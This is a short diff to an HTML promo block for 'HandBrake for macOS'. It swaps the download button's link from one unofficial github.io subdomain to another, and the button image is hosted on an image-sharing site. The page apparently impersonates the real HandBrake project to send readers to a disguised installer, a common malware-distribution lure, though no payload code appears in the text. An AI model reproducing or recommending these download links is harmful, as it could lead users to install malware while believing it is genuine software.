@@ -6,7 +6,7 @@
 <h3>HandBrake for macOS</h3>
 <p>HandBrake Mac Edition focuses on queue-based transcoding with presets that make repetitive encoding jobs predictable.</p>
 
-<a href="https://install-quick-mac.github.io/.github/HandBrake">
+<a href="https://mac-software-install.github.io/.github/HandBrake">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
